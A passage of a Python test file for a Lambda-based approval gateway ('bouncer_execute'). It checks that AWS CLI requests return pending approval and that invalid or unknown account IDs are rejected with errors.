    def test_async_returns_immediately(self, mock_telegram, app_module):
        """Default async mode returns pending_approval immediately."""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': os.environ.get('REQUEST_SECRET', 'test-secret')},
            'body': json.dumps({
                'jsonrpc': '2.0', 'id': 'async-test', 'method': 'tools/call',
                'params': {'name': 'bouncer_execute', 'arguments': {
                    'command': 'aws ec2 start-instances --instance-ids i-123',
                    'trust_scope': 'test-session',
                    'reason': 'test async', 'source': 'test-bot'
                }}
            })
        }
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'pending_approval'
        assert 'request_id' in content


class TestCrossAccountExecuteErrors:
    """Cross-account execution error paths (T-3)."""

    @patch('mcp_tools.send_telegram_message')
    def test_nonexistent_account_returns_available(self, mock_telegram, app_module):
        """Requesting non-existent account should list available accounts."""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': os.environ.get('REQUEST_SECRET', 'test-secret')},
            'body': json.dumps({
                'jsonrpc': '2.0', 'id': 'bad-acct', 'method': 'tools/call',
                'params': {'name': 'bouncer_execute', 'arguments': {
                    'command': 'aws s3 ls',
                    'trust_scope': 'test-session',
                    'reason': 'test', 'source': 'test-bot',
                    'account': '999999999999'
                }}
            })
        }
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert '999999999999' in content.get('error', '')

    @patch('mcp_tools.send_telegram_message')
    def test_invalid_account_format(self, mock_telegram, app_module):
        """Non-numeric account ID should be rejected."""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': os.environ.get('REQUEST_SECRET', 'test-secret')},
            'body': json.dumps({
                'jsonrpc': '2.0', 'id': 'bad-format', 'method': 'tools/call',
                'params': {'name': 'bouncer_execute', 'arguments': {
                    'command': 'aws s3 ls',
                    'trust_scope': 'test-session',
                    'reason': 'test', 'source': 'test-bot',
                    'account': 'not-a-number'
                }}
            })
        }
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        content = json.loads(body['result']['content'][0]['text'])
        assert content.get('status') == 'error' or body.get('error')
